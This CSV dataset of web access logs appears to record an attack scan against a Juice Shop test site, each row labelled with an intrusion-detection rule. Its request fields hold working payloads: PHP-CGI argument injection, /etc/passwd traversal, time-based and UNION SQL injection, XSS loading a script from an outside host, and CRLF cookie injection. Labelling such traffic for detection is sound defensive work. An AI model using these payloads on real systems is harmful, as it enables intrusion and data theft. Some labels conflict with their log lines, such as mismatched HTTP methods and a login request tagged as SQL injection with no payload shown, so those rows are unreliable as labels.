log_id,full_log,data.protocol,data.url,decoder.name,rule.description,rule.groups,rule.id,rule.level
996,"10.42.1.207 - - [12/May/2026:16:09:25 +0000] ""GET /redirect?to=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1429,"10.42.1.207 - - [12/May/2026:15:32:41 +0000] ""POST /application/node_modules/express/lib/router/assets/public/styles.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/express/lib/router/assets/public/styles.css?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1380,"10.42.0.234 - - [12/May/2026:15:32:46 +0000] ""POST /assets/public/images/carousel/3.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/carousel/3.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
633,"10.42.1.207 - - [12/May/2026:16:07:22 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
469,"10.42.1.207 - - [12/May/2026:16:14:06 +0000] ""GET /api/Challenges.log HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Challenges.log,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
614,"10.42.1.207 - - [12/May/2026:21:43:39 +0000] ""POST /redirect?to=%2F%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1"" 403 162 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36""",GET,/redirect?to=%2F%2F..%2F..%2F..%2Fetc%2Fpasswd,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
353,"10.42.2.150 - - [12/May/2026:16:18:36 +0000] ""GET /rest/Copy%20(2)%20of%20products HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/Copy%20(2)%20of%20products,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
998,"10.42.0.234 - - [12/May/2026:15:32:46 +0000] ""POST /assets/public/images/carousel/1.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/carousel/1.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
76,"10.42.0.12 - - [13/May/2026:02:00:08 +0000] ""GET /actuator/env HTTP/1.1"" 401 162 ""https://juice-shop.vtsolutions.it/"" ""python-requests/2.32.3""",POST,/actuator/env,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
323,"10.42.1.207 - - [12/May/2026:15:32:36 +0000] ""POST /api/SecurityQuestions?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 401 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/api/SecurityQuestions?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1390,"10.42.2.150 - - [12/May/2026:16:18:34 +0000] ""GET /rest/products/search.bac HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/products/search.bac,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
987,"10.42.2.150 - - [12/May/2026:16:13:46 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
951,"10.42.1.222 - - [13/May/2026:11:39:55 +0000] ""GET /rest/basket HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""curl/8.5.0""",GET,/rest/basket,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
1482,"10.42.1.207 - - [12/May/2026:15:32:52 +0000] ""POST /it.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/it.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1170,"10.42.0.234 - - [12/May/2026:16:13:07 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1339,"10.42.0.234 - - [12/May/2026:16:11:25 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1248,"10.42.1.207 - - [12/May/2026:15:32:03 +0000] ""GET /redirect?to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1382,"10.42.1.207 - - [12/May/2026:16:21:31 +0000] ""TRACE /rest/languages HTTP/1.1"" 500 - ""-"" ""-""",TRACE,/rest/languages,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
191,"10.42.0.234 - - [12/May/2026:16:20:13 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
547,"10.42.1.207 - - [12/May/2026:16:08:33 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
804,"10.42.2.150 - - [12/May/2026:15:32:56 +0000] ""POST /rest/user?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/rest/user?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1456,"10.42.0.234 - - [12/May/2026:15:32:43 +0000] ""POST /application/node_modules/serve-index/index.js:145:39?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/serve-index/index.js:145:39?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1099,"10.42.0.234 - - [12/May/2026:16:08:45 +0000] ""GET /rest/products/search?q=any%3F%0D%0ASet-cookie%3A+Tamper%3D94cfcd66-0538-4a80-94d0-84c268573e21%0D%0A HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=any%3F%0D%0ASet-cookie%3A+Tamper%3D94cfcd66-0538-4a80-94d0-84c268573e21%0D%0A,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
533,"10.42.0.234 - - [12/May/2026:15:32:48 +0000] ""POST /assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
67,"10.42.2.150 - - [12/May/2026:15:33:48 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
460,"10.42.2.150 - - [12/May/2026:16:20:08 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1399,"10.42.1.207 - - [12/May/2026:16:13:21 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
758,"10.42.1.207 - - [12/May/2026:16:14:12 +0000] ""GET /api/Quantitys.zip HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Quantitys.zip,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1426,"10.42.0.12 - - [13/May/2026:03:03:24 +0000] ""GET /api/BasketItems/admin%27--%20 HTTP/1.1"" 401 541 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0""",GET,/api/BasketItems/admin%27--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
85,"10.42.1.207 - - [12/May/2026:16:14:11 +0000] ""GET /api/Quantitys.bak HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Quantitys.bak,web-accesslog,Suspicious URL access.,"[""web"",""appsec"",""attack""]",31516,6
1378,"10.42.1.207 - - [12/May/2026:15:34:50 +0000] ""GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+ HTTP/1.1"" 302 568 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
158,"10.42.2.150 - - [12/May/2026:15:34:44 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1362,"10.42.1.207 - - [12/May/2026:15:32:55 +0000] ""POST /rest/languages?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/rest/languages?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
242,"10.42.2.150 - - [12/May/2026:15:34:41 +0000] ""GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%27+where+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1"" 302 236 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%27+where+0+in+%28select+sleep%2815%29+%29+--+,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
1134,"10.42.2.150 - - [12/May/2026:16:20:21 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1457,"10.42.2.150 - - [12/May/2026:16:09:19 +0000] ""POST /rest/user/login HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
60,"10.42.2.150 - - [12/May/2026:16:12:51 +0000] ""GET /api/Challenges/?name=%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2F10.42.1.84%3A44623%2F5c05d0c7-961b-4a66-9752-464ea25db6ea%22%3E HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2F10.42.1.84%3A44623%2F5c05d0c7-961b-4a66-9752-464ea25db6ea%22%3E,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
796,"10.42.2.77 - - [13/May/2026:11:05:40 +0000] ""POST /ftp/coupons_2013.md.bak HTTP/1.1"" 404 26 ""https://juice-shop.vtsolutions.it/"" ""curl/8.5.0""",POST,/ftp/coupons_2013.md.bak,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
630,"10.42.2.150 - - [12/May/2026:15:32:10 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1136,"10.42.1.94 - - [13/May/2026:07:21:18 +0000] ""GET /rest/products/search?q=%27%20OR%20%271%27%3D%271%27%20%2F%2A HTTP/1.1"" 500 753 ""https://juice-shop.vtsolutions.it/"" ""sqlmap/1.8.4#stable (https://sqlmap.org)""",GET,/rest/products/search?q=%27%20OR%20%271%27%3D%271%27%20%2F%2A,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
519,"10.42.1.207 - - [12/May/2026:16:13:06 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1474,"10.42.1.207 - - [13/May/2026:00:40:16 +0000] ""POST /rest/user/login HTTP/1.1"" 401 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15""",POST,/rest/user/login,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
150,"10.42.2.150 - - [12/May/2026:15:32:49 +0000] ""POST /bg.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/bg.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
729,"10.42.1.207 - - [12/May/2026:16:09:11 +0000] ""GET /rest/.env HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/.env,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
113,"10.42.0.234 - - [12/May/2026:16:07:09 +0000] ""GET /rest/products/search?q=%27%3Bget-help HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%27%3Bget-help,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sqlinjection"",""attack""]",31164,6
954,"10.42.0.234 - - [12/May/2026:15:32:46 +0000] ""POST /assets/public/images/hackingInstructor.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/hackingInstructor.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
853,"10.42.3.201 - - [13/May/2026:03:38:28 +0000] ""POST /rest/user/login HTTP/1.1"" 200 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
948,"10.42.0.234 - - [13/May/2026:07:33:29 +0000] ""POST /ftp/eastere.gg HTTP/1.1"" 404 162 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36""",POST,/ftp/eastere.gg,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
1458,"10.42.0.234 - - [12/May/2026:16:06:16 +0000] ""POST /rest/captcha HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/captcha,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
54,"10.42.2.150 - - [12/May/2026:16:22:28 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
597,"10.42.2.150 - - [12/May/2026:16:05:40 +0000] ""POST /rest/user/login HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
938,"10.42.1.207 - - [12/May/2026:15:34:33 +0000] ""GET /assets/public/images/uploads/magn(et')%20UNION%20ALL%20select%20NULL%20--%20)ificent!-1571814229653.jpg HTTP/1.1"" 200 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/assets/public/images/uploads/magn(et')%20UNION%20ALL%20select%20NULL%20--%20)ificent!-1571814229653.jpg,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
283,"10.42.1.207 - - [12/May/2026:15:32:08 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,10
510,"10.42.2.150 - - [12/May/2026:15:33:55 +0000] ""GET /redirect?to=%3C%2Ftitle%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E%3Ctitle%3E HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%3C%2Ftitle%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E%3Ctitle%3E,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,10
